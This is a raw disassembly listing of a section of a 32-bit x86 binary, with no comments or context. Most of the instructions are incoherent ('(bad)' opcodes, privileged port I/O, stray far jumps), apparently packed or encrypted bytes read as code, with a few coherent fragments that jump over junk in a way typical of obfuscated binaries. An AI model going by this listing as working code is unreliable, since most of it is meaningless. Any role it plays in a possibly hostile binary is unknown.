  408c29:	fs jmp 0xfd7fc10
  408c2f:	push   edx
  408c30:	ficom  WORD PTR [edx-0x7f]
  408c33:	inc    ebx
  408c34:	inc    edx
  408c35:	mov    DWORD PTR [eax+0x2e],esp
  408c38:	mov    ebp,0x561fc085
  408c3d:	sbb    dh,BYTE PTR [ebx+0x33d987fd]
  408c43:	xor    ah,0x89
  408c46:	pop    eax
  408c47:	dec    esp
  408c48:	dec    ebp
  408c49:	fs sub ebp,edi
  408c4c:	jle    0x408caf
  408c4e:	fiadd  DWORD PTR [ebx+0x50]
  408c51:	outs   dx,DWORD PTR ds:[esi]
  408c52:	dec    DWORD PTR [eax+0x7a7df738]
  408c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c59:	es xchg ecx,eax
  408c5b:	cmp    eax,edx
  408c5d:	mov    dh,bl
  408c5f:	fistp  DWORD PTR [ebp-0x7f62d45c]
  408c65:	fptan  
  408c67:	mov    WORD PTR [ecx+ebx*8],ds
  408c6a:	popa   
  408c6b:	sub    eax,0x5c82ae1d
  408c70:	stc    
  408c71:	inc    eax
  408c72:	mov    ds,WORD PTR [edi-0x7246f6d9]
  408c78:	inc    eax
  408c79:	stos   DWORD PTR es:[edi],eax
  408c7a:	or     eax,0xe98ab686
  408c7f:	adc    al,0xb9
  408c81:	push   edi
  408c82:	(bad)  
  408c83:	jg     0x408cf9
  408c85:	data16 shl BYTE PTR [edx-0x9],1
  408c89:	int3   
  408c8a:	out    dx,al
  408c8b:	adc    BYTE PTR [ecx-0x3b402c54],0xa9
  408c92:	xchg   ebp,eax
  408c93:	and    ebp,DWORD PTR [eax+0x47]
  408c96:	and    bl,bl
  408c98:	sbb    al,0x47
  408c9a:	adc    DWORD PTR [esi],ebx
  408c9c:	and    dl,al
  408c9e:	xor    al,0xa5
  408ca0:	ror    ebp,1
  408ca2:	cmp    DWORD PTR [bx+di],edi
  408ca5:	bound  eax,QWORD PTR [ecx]
  408ca7:	xchg   ecx,eax
  408ca8:	push   ss
  408ca9:	pop    ebp
  408caa:	push   cs
  408cab:	call   0xb426e81c
  408cb0:	or     edx,DWORD PTR [eax-0x3485560d]
  408cb6:	pop    edi
  408cb7:	aaa    
  408cb8:	cld    
  408cb9:	inc    ecx
  408cba:	js     0x408c79
  408cbc:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  408cbe:	sbb    DWORD PTR [ecx+0x6235bf20],ecx
  408cc4:	mov    ecx,0x3137ee36
  408cc9:	dec    eax
  408cca:	ss das 
  408ccc:	inc    esp
  408ccd:	adc    BYTE PTR [ecx-0x4],bl
  408cd0:	mov    WORD PTR es:[esi+ecx*2-0x4a],?
  408cd5:	aad    0xbc
  408cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cd8:	mov    esp,0xa67630cc
  408cdd:	push   ss
  408cde:	xor    cl,BYTE PTR [ebx+0x2d]
  408ce1:	or     BYTE PTR [ebp+0x9],dh
  408ce4:	xchg   BYTE PTR [esi],al
  408ce6:	shr    DWORD PTR [eax-0x18],1
  408ce9:	retf   0xec37
  408cec:	sub    al,0x7c
  408cee:	sbb    al,0xd0
  408cf0:	add    al,0xf6
  408cf2:	mov    ch,0x90
  408cf4:	xor    DWORD PTR [ebx+0x7715cd17],0x1e
  408cfb:	dec    edx
  408cfc:	xor    BYTE PTR [ebp-0x39],cl
  408cff:	not    BYTE PTR [edi]
  408d01:	jnp    0x408ccb
  408d03:	loop   0x408d1e
  408d05:	ds out dx,eax
  408d07:	imul   ecx,DWORD PTR [esi],0xc35ec220
  408d0d:	loope  0x408c99
  408d0f:	cli    
  408d10:	aam    0xcb
  408d12:	jge    0x408ccc
  408d14:	clc    
  408d15:	ins    DWORD PTR es:[edi],dx
  408d16:	out    0x58,eax
  408d18:	int3   
  408d19:	jp     0x408d0c
  408d1b:	push   ds
  408d1c:	dec    esp
  408d1d:	int    0x15
  408d1f:	jns    0x408d3d
  408d21:	add    BYTE PTR [ebx-0x47],bl
  408d24:	xor    ah,BYTE PTR [ebp+0x71984ca8]
  408d2a:	int3   
  408d2b:	fmul   DWORD PTR [edx-0x50d46dd2]
  408d31:	sub    al,0xa
  408d33:	aad    0x51
  408d35:	ror    BYTE PTR [ebx],1
  408d37:	jb     0x408d90
  408d39:	outs   dx,BYTE PTR ds:[esi]
  408d3a:	jb     0x408d7c
  408d3c:	cmp    BYTE PTR [edx-0x5a7c8f2b],0x11
  408d43:	sbb    BYTE PTR [esi],bl
  408d45:	cs pop eax
  408d47:	fidiv  WORD PTR [ebx-0x61f0a568]
  408d4d:	int3   
  408d4e:	pop    ds
  408d4f:	adc    DWORD PTR [ebx-0x41073fc9],edi
  408d55:	loopne 0x408ce8
  408d57:	pusha  
  408d58:	das    
  408d59:	sub    eax,0xda8d45b4
  408d5e:	pop    esi
  408d5f:	fisttp QWORD PTR [esi-0x63]
  408d62:	rcl    DWORD PTR [esi-0x21a9c06a],cl
  408d68:	mov    eax,ds:0xe0a30281
  408d6d:	push   esi
  408d6e:	scas   al,BYTE PTR es:[edi]
  408d6f:	inc    esi
  408d70:	sub    edx,edi
  408d72:	push   esi
  408d73:	repnz mov ds:0x4ab46758,eax
  408d79:	je     0x408d1a
  408d7b:	pop    esi
  408d7c:	ss aad 0x7b
  408d7f:	in     al,0x17
  408d81:	pop    ds
  408d82:	daa    
  408d83:	outs   dx,DWORD PTR gs:[esi]
  408d85:	dec    esi
  408d86:	xor    DWORD PTR [edx],ecx
  408d88:	(bad)  
  408d8a:	dec    eax
  408d8b:	(bad)  
  408d8c:	cwde   
  408d8d:	fs jbe 0x408d54
  408d90:	in     al,0x80
  408d92:	mov    ebx,0x5b0e76d4
  408d97:	mov    dl,0x14
  408d99:	pmaxub mm6,QWORD PTR [ecx+0x4843ad7a]
  408da0:	(bad)  
  408da1:	(bad)  
  408da2:	pop    ecx
  408da3:	push   ss
  408da4:	out    dx,al
  408da5:	sar    BYTE PTR [ebx+0x2a3a1afe],cl
  408dab:	js     0x408d9b
  408dad:	retf   0x5202
  408db0:	hlt    
  408db1:	dec    ecx
  408db2:	xchg   esp,eax
  408db3:	mov    ebp,0x4dacd3e0
  408db8:	sahf   
  408db9:	repnz push es
  408dbb:	jl     0x408d6e
  408dbd:	in     al,dx
  408dbe:	push   ebp
  408dbf:	mov    ebx,0xf95f5e90
  408dc4:	and    BYTE PTR [edx],0xf2
  408dc7:	xchg   esp,eax
  408dc8:	fnstcw WORD PTR [edx+0x75]
  408dcb:	jecxz  0x408e37
  408dcd:	or     al,BYTE PTR [ebx+0x40]
  408dd0:	fcmove st,st(1)
  408dd2:	in     al,dx
  408dd3:	or     bh,bh
  408dd5:	xlat   BYTE PTR ds:[ebx]
  408dd6:	push   ecx
  408dd7:	pop    ecx
  408dd8:	lahf   
  408dd9:	mov    edx,0x62ade268
  408dde:	pop    edi
  408ddf:	ds mov ecx,0xdfc892b6
  408de5:	xchg   DWORD PTR [eax+0x7e6f9700],ebx
  408deb:	out    0x68,eax
  408ded:	push   ecx
  408dee:	lods   eax,DWORD PTR ds:[esi]
  408def:	adc    esi,ecx
  408df1:	push   es
  408df2:	js     0x408dfc
  408df4:	cmp    eax,0x468f9424
  408df9:	xchg   esp,eax
  408dfa:	inc    ebx
  408dfb:	jmp    0x2b39:0x4022a35
  408e02:	enter  0xdcd3,0x32
  408e06:	(bad)  
  408e07:	ja     0x408e5d
  408e09:	pop    ebx
  408e0a:	xchg   edi,eax
  408e0b:	test   BYTE PTR [edi-0x29f40d4f],dl
  408e11:	mov    al,0x24
  408e13:	cmc    
  408e14:	ds jne 0x408da4
  408e17:	jmp    0x408e70
  408e19:	xor    ah,BYTE PTR [ebp+0x290aa546]
  408e1f:	fadd   st,st(5)
  408e21:	dec    esp
  408e22:	xor    eax,0x9d916d98
  408e27:	cs aaa 
  408e29:	out    dx,al
  408e2a:	outs   dx,DWORD PTR ds:[esi]
  408e2b:	fwait
  408e2c:	or     BYTE PTR [eax+0x37bfd029],0xc
  408e33:	mov    edx,0x962f4470
  408e38:	add    al,BYTE PTR [edx]
  408e3a:	add    esp,DWORD PTR [edx+ebp*4]
  408e3d:	div    DWORD PTR [ebp-0x53f0cc50]
  408e43:	rol    BYTE PTR [edx],1
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	or     DWORD PTR [eax],edx
  408e77:	stos   DWORD PTR es:[edi],eax
  408e78:	mov    al,0x3a
  408e7a:	push   ecx
  408e7b:	sbb    BYTE PTR [eax],bl
  408e7d:	sahf   
  408e7e:	adc    bl,BYTE PTR [eax]
  408e80:	sbb    BYTE PTR [ecx],al
  408e82:	add    DWORD PTR [ecx+esi*1+0x6c],esp
  408e86:	das    
  408e87:	pop    edx
  408e88:	fcmovnu st,st(3)
  408e8a:	(bad)  
  408e8b:	mov    edx,0x26370082
  408e90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e91:	bound  eax,QWORD PTR [ecx-0x35930f96]
  408e97:	sub    eax,DWORD PTR [ecx+edi*4-0x15]
  408e9b:	mov    ebx,0x7e596d78
  408ea0:	sub    dl,BYTE PTR [esi]
  408ea2:	adc    al,0x2a
  408ea4:	and    al,0x30
  408ea6:	loop   0x408ec3
  408ea8:	rcr    BYTE PTR [ecx-0x1bde7689],0xc0
  408eaf:	mov    ds:0xad84e01e,eax
  408eb4:	xchg   ebx,eax
  408eb5:	and    al,0x4e
  408eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eb8:	test   BYTE PTR [edx],ah
  408eba:	std    
  408ebb:	into   
  408ebc:	pop    es
  408ebd:	fsubr  DWORD PTR [ecx]
  408ebf:	cld    
  408ec0:	rcl    al,1
  408ec2:	push   esi
  408ec3:	data16 mov ds:0x4292c7b9,al
  408ec9:	retf   0x7c14
  408ecc:	fadd   DWORD PTR [ebx]
  408ece:	jmp    FWORD PTR [esi-0x60]
  408ed1:	imul   esi,ebx,0x2ae87e6d
  408ed7:	in     eax,dx
  408ed8:	neg    BYTE PTR [esi]
  408eda:	sub    DWORD PTR [edi],eax
  408edc:	jb     0x408f4f
  408ede:	mov    eax,ds:0x9bbd8783
  408ee3:	sar    DWORD PTR [esi],0x4c
  408ee6:	sti    
  408ee7:	rcl    DWORD PTR [eax+ecx*2+0x21],1
  408eeb:	or     DWORD PTR [ecx-0x33],ebx
  408eee:	je     0x408ec3
  408ef0:	and    esp,DWORD PTR [ecx]
  408ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef3:	add    dh,BYTE PTR [ecx]
  408ef5:	(bad)  
  408ef6:	shr    ebx,cl
  408ef8:	jmp    0x408f2e
  408efa:	leave  
  408efb:	bound  ebp,QWORD PTR [ebx-0x5ac4b2c9]
  408f01:	test   al,0xe7
  408f03:	jb     0x408f05
  408f05:	scas   al,BYTE PTR es:[edi]
  408f06:	in     eax,0x2b
  408f08:	lea    eax,ds:[ebx-0x5ffeacaa]
  408f0f:	shl    DWORD PTR [esi+0xc402514],cl
  408f15:	inc    esi
  408f16:	sub    al,0x63
  408f18:	push   edi
  408f19:	pop    es
  408f1a:	or     esi,DWORD PTR [ebx+0x391c1bb7]
  408f20:	mov    ?,WORD PTR [esi+ebx*4+0x20]
  408f24:	jmp    0x408ee3
  408f26:	ins    DWORD PTR es:[edi],dx
  408f27:	cmp    BYTE PTR [ecx-0x284ee6ee],dh
  408f2d:	push   edx
  408f2e:	rcl    edx,0x54
  408f31:	imul   ebx,DWORD PTR [edx-0x62],0xd28a4a1
  408f38:	or     al,0x5c
  408f3a:	leave  
  408f3b:	mov    BYTE PTR [eax+0x615c4fc9],0x9e
  408f42:	cli    
  408f43:	dec    eax
  408f44:	cld    
  408f45:	sbb    esi,ebp
  408f47:	add    DWORD PTR [ecx],ebp
  408f49:	arpl   WORD PTR [edx+0x6b40212],sp
  408f4f:	dec    eax
  408f50:	push   cs
  408f51:	sahf   
  408f52:	inc    esp
  408f53:	gs xor eax,0x7fd98e28
  408f59:	les    ebp,FWORD PTR [edi-0x6ef52fbd]
  408f5f:	ror    DWORD PTR [ebp+0x7],1
  408f62:	iret   
  408f63:	xor    DWORD PTR [esi-0x3853b6e8],esi
  408f69:	push   eax
  408f6a:	lahf   
  408f6b:	xor    dl,BYTE PTR [ebp+0x5cc301f6]
  408f71:	mov    ecx,0x61b154b4
  408f76:	push   cs
  408f77:	out    dx,eax
  408f78:	inc    esi
  408f79:	pop    ds
  408f7a:	repz adc al,BYTE PTR [edi+0x47]
  408f7e:	and    eax,0xe18aca7d
  408f83:	(bad)  [edi]
  408f85:	std    
  408f86:	loop   0x408f86
  408f88:	out    dx,al
  408f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f8a:	xor    BYTE PTR [edx+0x6d],0xaf
  408f8e:	inc    BYTE PTR [edx-0x6a]
  408f91:	sub    al,BYTE PTR [esi+ebp*8+0x0]
  408f95:	inc    ecx
  408f96:	push   ebx
  408f97:	(bad)  
  408f98:	aas    
  408f99:	dec    esi
  408f9a:	or     BYTE PTR [edx+0x1d],0x51
  408f9e:	cmp    BYTE PTR [ecx],bh
  408fa0:	mov    ebp,0x8cd47a9d
  408fa5:	pop    ebx
  408fa6:	je     0x408f5e
  408fa8:	aas    
  408fa9:	push   esp
  408faa:	inc    eax
  408fab:	mov    ebx,0xcaab10ee
  408fb0:	mov    WORD PTR [ecx],ds
  408fb2:	ror    DWORD PTR [ebx+ebp*2],cl
  408fb5:	inc    ecx
  408fb6:	pop    esi
  408fb7:	out    0x53,eax
  408fb9:	pop    esp
  408fba:	btc    DWORD PTR [ebx-0x3b756d90],edi
  408fc1:	lock rol WORD PTR [ecx],1
  408fc5:	repnz icebp 
  408fc7:	inc    ecx
  408fc8:	sbb    BYTE PTR [ebx+0x7b4c38af],bl
  408fce:	ror    edi,1
  408fd0:	pushf  
  408fd1:	add    cl,BYTE PTR [edx+0x70dbeb0d]
  408fd7:	mov    al,ds:0x70628d40
  408fdc:	das    
  408fdd:	ins    DWORD PTR es:[edi],dx
  408fde:	(bad)  
  408fdf:	les    edi,FWORD PTR [ebp+0x2a056076]
  408fe5:	sbb    dh,0x7b
  408fe8:	push   eax
  408fe9:	popa   
  408fea:	sub    al,0x20
  408fec:	aam    0x37
  408fee:	sti    
  408fef:	jno    0x408f7e
  408ff1:	imul   edx,DWORD PTR [ebx+0x5f1e18d1],0xba5be88f
  408ffb:	mov    al,0x12
  408ffd:	dec    edx
  408ffe:	nop
  408fff:	out    0x3e,eax
  409001:	in     al,dx
  409002:	(bad)  
  409003:	pop    eax
  409004:	sub    eax,0x3c17d081
  409009:	out    dx,al
  40900a:	push   ecx
  40900b:	(bad)  
  40900c:	push   ebp
  40900d:	es or  eax,0x92da0fbb
  409013:	es add bl,al
  409016:	ins    BYTE PTR es:[edi],dx
  409017:	outs   dx,DWORD PTR ds:[esi]
  409018:	icebp  
  409019:	(bad)  
  40901b:	jecxz  0x408fc5
  40901d:	icebp  
  40901e:	loop   0x408fbb
  409020:	mov    DWORD PTR [esi],edi
  409022:	adc    eax,0x59e85c4a
  409027:	aam    0x6b
  409029:	push   ebp
  40902a:	pop    ss
  40902b:	mov    BYTE PTR [edi],ah
  40902d:	add    BYTE PTR [ebp+esi*8+0x8],0xbd
  409032:	into   
  409033:	add    al,bh
  409035:	xchg   ebx,eax
  409036:	repz push eax
  409038:	cmp    al,0x42
  40903a:	nop
  40903b:	add    al,BYTE PTR [ebx+edi*1]
  40903e:	clc    
  40903f:	es mov edi,0xaf564f83
  409045:	mov    eax,0x2a57dfcf
  40904a:	xchg   ecx,eax
  40904b:	jne    0x408ff6
  40904d:	hlt    
  40904e:	dec    edx
  40904f:	hlt    
  409050:	iret   
  409051:	dec    eax
  409052:	fdivr  QWORD PTR [ebp-0x79c4a84c]
  409058:	and    ebp,DWORD PTR [edx+0x6256ca47]
  40905e:	rcr    ah,1
  409060:	mov    ch,0xf9
  409062:	sar    BYTE PTR [esi],0x4d
  409065:	out    0xcd,al
  409067:	jne    0x409011
  409069:	jbe    0x40903e
  40906b:	hlt    
  40906c:	lods   al,BYTE PTR ds:[esi]
  40906d:	mov    eax,0xcdda38b2
  409072:	cmp    eax,0xa00a55fc
  409077:	mov    ch,0xc1
  409079:	lods   eax,DWORD PTR ds:[esi]
  40907a:	jmp    0x409005
  40907c:	sbb    BYTE PTR [ebp+0x7c],bh
  40907f:	jp     0x40905c
  409081:	inc    ecx
  409082:	adc    dl,BYTE PTR [ebx+0x68ba046b]
  409088:	sahf   
  409089:	call   0x2a36904e
  40908e:	pop    ecx
  40908f:	retf   0x48d8
  409092:	sub    eax,0x85f35a2a
  409097:	out    dx,eax
  409098:	aam    0xe1
  40909a:	adc    al,bl
  40909c:	test   BYTE PTR [esi],dl
  40909e:	dec    edx
  40909f:	push   0x59
  4090a1:	loop   0x40908a
  4090a3:	imul   edx,DWORD PTR [edx],0x18ca0d01
  4090a9:	in     eax,dx
  4090aa:	push   ebp
  4090ab:	pop    esi
  4090ad:	call   0xa07:0xeb27b473
  4090b4:	shr    BYTE PTR [edi+eiz*4+0x69],1
  4090b8:	stc    
  4090b9:	(bad)  
  4090ba:	mov    esp,0xc912b641
  4090bf:	arpl   dx,ax
  4090c1:	icebp  
  4090c2:	or     DWORD PTR [ecx-0xef67c7f],esi
  4090c8:	mov    ah,0x20
  4090ca:	jb     0x40908c
  4090cc:	loop   0x40907f
  4090ce:	les    ebp,FWORD PTR [eax-0x53]
  4090d1:	jnp    0x40912b
  4090d3:	add    eax,0x746ea69c
  4090d8:	push   cs
  4090d9:	jmp    0x4090b2
  4090db:	sub    dh,BYTE PTR [eax]
  4090dd:	jnp    0x409135
  4090df:	fdivrp st(2),st
  4090e1:	pop    edi
  4090e2:	leave  
  4090e3:	ret    0x2e16
  4090e6:	shl    DWORD PTR [esi+0x22fea5ed],1
  4090ec:	test   BYTE PTR [ebx+0x1850aa96],cl
  4090f2:	mov    eax,ds:0x612bd6d1
  4090f7:	push   edx
  4090f8:	fwait
  4090f9:	xchg   ecx,eax
  4090fa:	bound  edx,QWORD PTR [ecx+0x74ce5d93]
  409100:	cmp    ah,BYTE PTR [eax]
  409102:	xchg   esi,eax
  409103:	jle    0x409154
  409105:	out    0xfe,al
  409107:	xor    edx,DWORD PTR [edx-0x3dda366f]
  40910d:	pop    esp
  40910e:	std    
  40910f:	mov    dh,0x60
  409111:	push   edi
  409112:	enter  0xf2f8,0x55
  409116:	mov    WORD PTR es:0xa00b83c3,ss
  40911d:	scas   al,BYTE PTR es:[edi]
  40911e:	push   ecx
  40911f:	fwait
  409120:	in     al,0x3c
  409122:	in     eax,dx
  409123:	add    BYTE PTR fs:[esi+edi*4-0x78b7807c],ch
  40912b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40912c:	push   es
  40912d:	mov    al,ds:0xdbc63176
  409132:	push   ss
  409133:	jmp    0x8860:0x90433b10
  40913a:	lock std 
  40913c:	sbb    BYTE PTR [ebx-0x132ec7cc],al
  409142:	lods   al,BYTE PTR ds:[esi]
  409143:	adc    BYTE PTR [edi],0xfb
  409146:	jle    0x4091a4
  409148:	xchg   esi,eax
  409149:	addr16 mov eax,0x51d639d7
  40914f:	xor    BYTE PTR [esi-0x66],ch
  409152:	leave  
  409153:	mov    ch,0x4f
  409155:	push   es
  409156:	mov    ch,0x77
  409158:	ror    DWORD PTR [ebx],0x4d
  40915b:	fimul  WORD PTR [eax]
  40915d:	cvtps2pi mm2,QWORD PTR [ecx*2+0x499f0961]
  409165:	dec    ecx
  409166:	sbb    al,0x9
  409168:	aas    
  409169:	fild   WORD PTR [ebp-0x1a]
  40916c:	or     eax,0xbeb32a3
  409171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409172:	or     DWORD PTR [ecx+0x28],0x10
  409176:	mov    ch,0xf
  409178:	mov    bl,BYTE PTR [ecx+0x7]
  40917b:	xchg   ebx,eax
  40917c:	mov    ch,0x70
  40917e:	and    DWORD PTR [ebx-0x6f],edi
  409181:	enter  0x7c99,0x95
  409185:	mov    ebx,0xb65d76d9
  40918a:	icebp  
  40918b:	xlat   BYTE PTR ds:[ebx]
  40918c:	mov    ds:0xa3de7955,eax
  409191:	ror    BYTE PTR [ebx-0x58415539],1
  409197:	sub    BYTE PTR [eax+0x76423d44],ch
  40919d:	mov    dl,0x8e
  40919f:	sbb    al,0x8f
  4091a1:	xchg   edx,eax
  4091a2:	sbb    al,0x40
  4091a4:	out    0x49,al
  4091a6:	cmp    al,0x59
  4091a8:	imul   DWORD PTR [bp+di+0x5d]
  4091ac:	arpl   WORD PTR [edx],cx
  4091ae:	cli    
  4091af:	or     ah,BYTE PTR [edi-0x7e]
  4091b2:	mov    eax,0x3e9579ff
  4091b7:	jl     0x4091ed
  4091b9:	xchg   ebx,eax
  4091ba:	int    0xd5
  4091bc:	int    0xab
  4091be:	loope  0x4091d0
  4091c0:	call   0xf57830c7
  4091c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091c6:	iret   
  4091c7:	sti    
  4091c8:	in     al,dx
  4091c9:	xor    ebp,ecx
  4091cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091cc:	aad    0x50
  4091ce:	xor    edi,0x4a
  4091d1:	out    0x9e,eax
  4091d3:	in     al,dx
  4091d4:	nop
  4091d5:	jae    0x4091a5
  4091d7:	aas    
  4091d8:	in     eax,0x5f
  4091da:	cmp    ebx,DWORD PTR [ebx]
  4091dc:	pop    ebx
  4091dd:	or     DWORD PTR [edi+0x1],ebx
  4091e0:	add    dh,BYTE PTR [edi+0x37]
  4091e3:	sub    eax,0xede424bd
  4091e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091e9:	test   BYTE PTR ds:0x68acda7,bh
  4091ef:	push   edi
  4091f0:	arpl   WORD PTR [edi],dx
  4091f2:	jmp    0x40919a
  4091f4:	mov    DWORD PTR [ebp-0x4c],eax
  4091f7:	xor    DWORD PTR [edi],edx
  4091f9:	cli    
  4091fa:	pop    ds
  4091fb:	pop    ss
  4091fc:	sbb    ax,si
  4091ff:	adc    bh,ah
  409201:	and    al,0x4a
  409203:	xchg   esi,eax
  409204:	sbb    bl,cl
  409206:	(bad)  
  409207:	xor    bl,ah
  409209:	jo     0x4091ce
  40920b:	mov    cl,0x5e
  40920d:	sahf   
  40920e:	push   cs
  40920f:	clc    
  409210:	shl    DWORD PTR [ecx],0xcb
  409213:	test   bh,ah
  409215:	ins    BYTE PTR es:[edi],dx
  409216:	sub    ah,cl
  409218:	fwait
  409219:	push   edx
  40921a:	fcom   QWORD PTR [ecx]
  40921c:	inc    ebx
  40921d:	leave  
  40921e:	popa   
  40921f:	xchg   esi,eax
  409220:	lea    ebp,[edi]
  409222:	jb     0x409211
  409224:	outs   dx,BYTE PTR ds:[esi]
  409225:	cmp    eax,0x853387f3
  40922a:	rcl    edi,0x87
  40922d:	inc    ebp
  40922e:	push   cs
  40922f:	mov    bl,0x1
  409231:	aas    
  409232:	mov    bh,cl
  409234:	sub    BYTE PTR [esi+0x45],dh
  409237:	sub    DWORD PTR [esi+0x19],edi
  40923a:	jae    0x409234
  40923c:	ins    BYTE PTR es:[edi],dx
  40923d:	jae    0x409203
  40923f:	into   
  409240:	fwait
  409241:	push   ss
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0xc009370
  409261:	jle    0x409223
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    dh,dl
  40926b:	mov    edx,0x1471f9dd
  409270:	adc    al,0x94
  409272:	mov    eax,0xd32dc04a
  409277:	cmp    eax,0x551f88bc
  40927c:	pop    ebp
  40927d:	push   edx
  40927e:	xor    al,0x4d
  409280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409281:	jmp    FWORD PTR [edx]
  409283:	loop   0x409220
  409285:	add    al,0x24
  409287:	(bad)  
  409288:	mov    bl,0xdb
  40928a:	bound  eax,QWORD PTR [eax]
  40928c:	in     al,0x32
  40928e:	das    
  40928f:	hlt    
  409290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409291:	push   edi
  409292:	out    0xda,eax
  409294:	outs   dx,BYTE PTR ds:[esi]
  409295:	ss inc ebx
  409297:	or     eax,0x30e719f9
  40929c:	rcl    DWORD PTR [esi+0x75],cl
  40929f:	fwait
  4092a0:	push   ss
  4092a1:	pusha  
  4092a2:	push   0x730f6474
  4092a7:	sahf   
  4092a8:	fild   QWORD PTR [ebp+ebx*8-0x6350fc66]
  4092af:	arpl   WORD PTR [edx+0x36cebbf],sp
  4092b5:	fldcw  WORD PTR [edi+0x1]
  4092b8:	jae    0x409324
  4092ba:	fnstenv [ebx-0x2a]
  4092bd:	imul   esp,DWORD PTR [edi],0x10
  4092c0:	pop    ebx
  4092c1:	pop    ebx
  4092c2:	mov    ebp,0x6a061b53
  4092c7:	sbb    cl,BYTE PTR [ecx+ebp*8-0x2c]
  4092cb:	or     al,ch
  4092cd:	or     DWORD PTR [esp+edi*1-0x78],ebx
  4092d1:	push   ss
  4092d2:	scas   eax,DWORD PTR es:[edi]
  4092d3:	inc    edx
  4092d4:	(bad)  
  4092d5:	xchg   esi,eax
  4092d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092d7:	add    al,0xf8
  4092d9:	pop    ecx
  4092da:	popa   
  4092db:	mov    DWORD PTR [ebp+0xa],edi
  4092de:	xor    al,0xeb
  4092e0:	adc    dh,BYTE PTR [esi+0x7b469405]
  4092e6:	loope  0x409352
  4092e8:	inc    ecx
  4092e9:	shl    BYTE PTR [ebx+0x16e52635],0xa9
  4092f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f1:	fcmovu st,st(3)
  4092f3:	dec    ecx
  4092f4:	stc    
  4092f5:	add    ebx,DWORD PTR [esi]
  4092f7:	pop    eax
  4092f8:	mov    esi,0xddb8805d
  4092fd:	mov    dl,0xdc
  4092ff:	adc    ebx,esi
  409301:	call   0x526a:0x510af22d
  409308:	add    al,0xd6
  40930a:	hlt    
  40930b:	mov    ebp,0x83d0757f
  409310:	jle    0x40930d
  409312:	dec    ebx
  409313:	sub    al,0x86
  409315:	jmp    0x409370
  409317:	in     al,0xf
  409319:	and    DWORD PTR [edi-0x206cc010],esi
  40931f:	dec    esi
  409320:	or     edi,DWORD PTR [edx+0x4d]
  409323:	dec    eax
  409324:	cmc    
  409325:	mov    eax,0x10089bdc
  40932a:	inc    ebp
  40932b:	xchg   edx,eax
  40932c:	jl     0x409321
  40932e:	inc    edx
  40932f:	pusha  
  409330:	pop    es
  409331:	psrlw  mm3,mm7
  409334:	std    
  409335:	jmp    0xf8aaed4a
  40933a:	add    ah,BYTE PTR [edx]
  40933c:	inc    edi
  40933d:	popa   
  40933e:	call   0x89a3:0x9c080ad
  409345:	ret    0xfeba
  409348:	nop
  409349:	sbb    edx,esp
  40934b:	rcr    DWORD PTR [edi+0x57],cl
  40934e:	arpl   WORD PTR [edi],ax
  409350:	add    edx,DWORD PTR [eax+ebp*4]
  409353:	cmp    ch,BYTE PTR [ebp-0x59]
  409356:	pop    edx
  409357:	test   al,0xde
  409359:	aas    
  40935a:	adc    esp,DWORD PTR [ebp-0x69]
  40935d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40935e:	mov    edx,0xa50302ab
  409363:	or     dl,al
  409365:	mov    eax,ds:0x231de6bc
  40936a:	cmp    eax,edi
  40936c:	dec    ebp
  40936d:	inc    eax
  40936e:	jb     0x4093ef
  409370:	xchg   ecx,eax
  409371:	mov    edx,0x202b7f7b
  409376:	mov    WORD PTR [bx],?
  409379:	jp     0x4093bf
  40937b:	enter  0x9751,0x44
  40937f:	push   es
  409380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409381:	retf   
  409382:	std    
  409383:	mov    BYTE PTR [eax-0x21],bh
  409386:	xor    ebp,eax
  409388:	sbb    al,0xe3
  40938a:	in     eax,dx
  40938b:	lds    ebp,FWORD PTR [eax+0x4d0c74f7]
  409391:	mov    esp,0x68817d63
  409396:	sahf   
  409397:	mov    cl,0x4
  409399:	je     0x409383
  40939b:	fwait
  40939c:	xchg   edx,eax
  40939d:	push   cs
  40939e:	or     ch,bl
  4093a0:	retf   0x40eb
  4093a3:	xor    dl,BYTE PTR [ecx+0x66]
  4093a6:	push   0x411ac5de
  4093ab:	popf   
  4093ac:	jecxz  0x409410
  4093ae:	xor    DWORD PTR [eax],ebx
  4093b0:	xchg   BYTE PTR [edx+ebx*1+0x16],bh
  4093b4:	jb     0x4093e0
  4093b6:	xor    bh,BYTE PTR [ebx+0x7c75ca87]
  4093bc:	std    
  4093bd:	ja     0x409363
